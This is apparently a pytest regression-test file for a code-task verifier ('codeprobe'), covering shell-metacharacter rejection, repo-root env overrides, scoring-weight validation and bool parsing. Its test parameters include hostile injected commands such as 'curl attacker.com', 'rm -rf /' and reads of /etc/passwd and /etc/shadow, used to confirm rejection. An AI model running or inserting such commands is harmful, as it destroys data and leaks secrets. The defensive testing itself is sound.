"""Regression tests for adversarial review fixes on the dual verifier.

Covers the critical / high findings from codex + copilot reviews:

- test.sh uses ``TASK_REPO_ROOT`` env var so the direct leg runs against
  the per-run worktree, not the shared mined repo_path.
- Shell metacharacters in verification commands are rejected at write
  time; prefix-only allowlist was trivially bypassable.
- DualScorer weight validation rejects non-finite and out-of-range
  weights when ``scoring_policy="weighted"``; invalid weights no longer
  silently coerce to 0.5 and clamp a failed artifact into a pass.
- Strict bool parsing on serialized scoring_details handles the
  ``bool("False") is True`` pitfall.
- In dual mode the executor does NOT fall back to ``repo_path`` for
  stale answer artifacts.
"""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest

from codeprobe.analysis.dual import resolve_leg_pass
from codeprobe.core.scoring import DualScorer, scorer_env_override
from codeprobe.models.experiment import CompletedTask, DualScoringDetails
from codeprobe.models.task import Task, TaskMetadata, TaskVerification
from codeprobe.mining.writer import _build_test_script, write_task_dir


class TestWriterCommandHardening:
    """Shell metacharacter rejection in the verification command."""

    @pytest.mark.parametrize(
        "bad_cmd",
        [
            "pytest tests; curl attacker.com",
            "pytest tests | tee /tmp/leak",
            "pytest tests && rm -rf /",
            "pytest tests `whoami`",
            "pytest tests $(cat /etc/passwd)",
            "pytest tests > /dev/null",
            "pytest tests < /etc/shadow",
            "pytest tests\ncurl attacker.com",
        ],
    )
    def test_metacharacters_rejected(self, bad_cmd: str, tmp_path: Path) -> None:
        """Any shell metacharacter triggers a ValueError at write time."""
        with pytest.raises(ValueError, match="metacharacter|not allowed|allowlist"):
            _build_test_script(bad_cmd, tmp_path, header="test")

    def test_allowlist_prefix_still_enforced(self, tmp_path: Path) -> None:
        """Clean but non-allowlisted commands still fail."""
        with pytest.raises(ValueError, match="allowlist"):
            _build_test_script("rm -rf /", tmp_path, header="test")

    def test_allowed_clean_command_passes(self, tmp_path: Path) -> None:
        """An allowlisted command without metacharacters is accepted."""
        script = _build_test_script(
            "bash tests/test.sh", tmp_path, header="direct verification"
        )
        assert "bash tests/test.sh" in script
        assert "TASK_REPO_ROOT" in script


class TestTaskRepoRootInjection:
    """Generated test.sh honors the TASK_REPO_ROOT env override."""

    def test_task_repo_root_env_used_when_set(self, tmp_path: Path) -> None:
        """test.sh cd's into TASK_REPO_ROOT when the env var is set."""
        real_dir = tmp_path / "real"
        real_dir.mkdir()
        fallback_dir = tmp_path / "fallback"
        fallback_dir.mkdir()

        script = _build_test_script(
            'pytest -q -c "" --collect-only',
            fallback_dir,
            header="integration probe",
        )
        # Strip the actual test command so we only observe the cd target.
        lines = [line for line in script.splitlines() if not line.startswith("pytest")]
        lines.append("pwd")
        probe = "\n".join(lines) + "\n"
        script_path = tmp_path / "probe.sh"
        script_path.write_text(probe, encoding="utf-8")

        # Case 1: TASK_REPO_ROOT points at real_dir → bash cd's there.
        env = {**os.environ, "TASK_REPO_ROOT": str(real_dir)}
        result = subprocess.run(
            ["bash", str(script_path)],
            env=env,
            capture_output=True,
            text=True,
            check=True,
        )
        assert Path(result.stdout.strip()).resolve() == real_dir.resolve()

        # Case 2: TASK_REPO_ROOT unset → falls back to mined dir.
        env_no_override = {k: v for k, v in os.environ.items() if k != "TASK_REPO_ROOT"}
        result = subprocess.run(
            ["bash", str(script_path)],
            env=env_no_override,
            capture_output=True,
            text=True,
            check=True,
        )
        assert Path(result.stdout.strip()).resolve() == fallback_dir.resolve()


class TestDualScorerWeightValidation:
    """Invalid weights cause weighted scoring to fail closed."""

    def _dual_task_dir(self, tmp_path: Path, verification_extra: dict) -> Path:
        task_dir = tmp_path / "task"
        task_dir.mkdir()
        (task_dir / "tests").mkdir()
        (task_dir / "tests" / "test.sh").write_text(
            "#!/bin/bash\nexit 0\n", encoding="utf-8"
        )
        (task_dir / "tests" / "test.sh").chmod(0o755)
        (task_dir / "tests" / "ground_truth.json").write_text(
            json.dumps({"schema_version": 1, "answer_type": "file_list", "answer": []}),
            encoding="utf-8",
        )
        metadata = {
            "id": "t1",
            "repo": "r",
            "verification": {
                "verification_mode": "dual",
                "scoring_policy": "weighted",
                **verification_extra,
            },
        }
        (task_dir / "metadata.json").write_text(json.dumps(metadata), encoding="utf-8")
        return task_dir

    def test_negative_weight_rejected(self, tmp_path: Path) -> None:
        task_dir = self._dual_task_dir(
            tmp_path, {"weight_direct": -0.5, "weight_artifact": 1.5}
        )
        result = DualScorer().score("", task_dir)
        assert result.score == 0.0
        assert result.error is not None and "weights" in result.error
        assert "error_weights" in result.details

    def test_over_one_weight_rejected(self, tmp_path: Path) -> None:
        task_dir = self._dual_task_dir(
            tmp_path, {"weight_direct": 2.0, "weight_artifact": -1.0}
        )
        result = DualScorer().score("", task_dir)
        assert result.score == 0.0
        assert "error_weights" in result.details

    def test_nonfinite_weight_rejected(self, tmp_path: Path) -> None:
        task_dir = self._dual_task_dir(
            tmp_path, {"weight_direct": float("inf"), "weight_artifact": 0.5}
        )
        result = DualScorer().score("", task_dir)
        assert result.score == 0.0
        assert "error_weights" in result.details

    def test_non_numeric_weight_rejected(self, tmp_path: Path) -> None:
        task_dir = self._dual_task_dir(
            tmp_path, {"weight_direct": "abc", "weight_artifact": 0.5}
        )
        result = DualScorer().score("", task_dir)
        assert result.score == 0.0
        assert "error_weights" in result.details

    def test_valid_weights_accepted(self, tmp_path: Path) -> None:
        task_dir = self._dual_task_dir(
            tmp_path, {"weight_direct": 0.3, "weight_artifact": 0.7}
        )
        result = DualScorer().score("", task_dir)
        # test.sh exits 0 → direct=1.0, artifact=0.0 (empty oracle → F1=0)
        # weighted = 0.3*1.0 + 0.7*0.0 = 0.3
        assert 0.25 <= result.score <= 0.35
        assert "error_weights" not in result.details


class TestStrictBoolParsing:
    """Serialized string "False" must not coerce to Python True."""

    def test_string_false_parsed_as_false(self) -> None:
        details = DualScoringDetails.from_dict({"passed_direct": "False"})
        assert details.passed_direct is False

    def test_string_true_parsed_as_true(self) -> None:
        details = DualScoringDetails.from_dict({"passed_direct": "true"})
        assert details.passed_direct is True

    def test_resolve_leg_pass_handles_string_false(self) -> None:
        task = CompletedTask(
            task_id="t",
            automated_score=1.0,
            scoring_details={
                "score_direct": 1.0,
                "score_artifact": 1.0,
                "passed_direct": "False",
                "passed_artifact": "False",
            },
        )
        direct, artifact = resolve_leg_pass(task)
        assert direct is False
        assert artifact is False


class TestScorerEnvOverride:
    """Thread-local scorer env overrides propagate to subprocess envs."""

    def test_override_is_visible_in_safe_env(self) -> None:
        from codeprobe.core.scoring import _safe_env

        with scorer_env_override({"TASK_REPO_ROOT": "/tmp/worktree-42"}):
            env = _safe_env()
            assert env.get("TASK_REPO_ROOT") == "/tmp/worktree-42"
        # Restored after exit.
        env_after = _safe_env()
        assert (
            "TASK_REPO_ROOT" not in env_after
            or env_after["TASK_REPO_ROOT"] != "/tmp/worktree-42"
        )

    def test_override_is_thread_local(self) -> None:
        """Two threads can hold independent overrides concurrently."""
        import threading

        from codeprobe.core.scoring import _safe_env

        results: dict[str, str] = {}
        barrier = threading.Barrier(2)

        def worker(key: str, value: str) -> None:
            with scorer_env_override({"TASK_REPO_ROOT": value}):
                barrier.wait()  # ensure both threads are inside the context
                results[key] = _safe_env().get("TASK_REPO_ROOT", "")

        t1 = threading.Thread(target=worker, args=("a", "/tmp/wt-a"))
        t2 = threading.Thread(target=worker, args=("b", "/tmp/wt-b"))
        t1.start()
        t2.start()
        t1.join()
        t2.join()
        assert results == {"a": "/tmp/wt-a", "b": "/tmp/wt-b"}
